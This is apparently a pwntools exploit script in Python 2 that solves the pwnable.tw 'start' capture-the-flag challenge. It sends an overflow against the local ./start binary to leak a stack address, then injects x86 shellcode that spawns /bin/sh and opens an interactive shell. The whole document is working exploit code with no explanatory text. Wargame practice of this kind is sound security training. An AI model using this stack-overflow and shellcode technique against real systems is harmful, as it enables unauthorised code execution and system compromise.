from pwn import *
context.log_level='debug'
shellcode = '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
#p=remote("chall.pwnable.tw",10000)
print len(shellcode)
p=process("./start")
print p.recvuntil(":")
raw_input()
p.sendline("".ljust(20,'x')+p32(0x8048087))
data=p.recv()
leak=(u32(data[:4]))
print hex(leak)
sleep(1)
p.sendline('a'*20+p32(leak+20)+shellcode)
p.interactive()
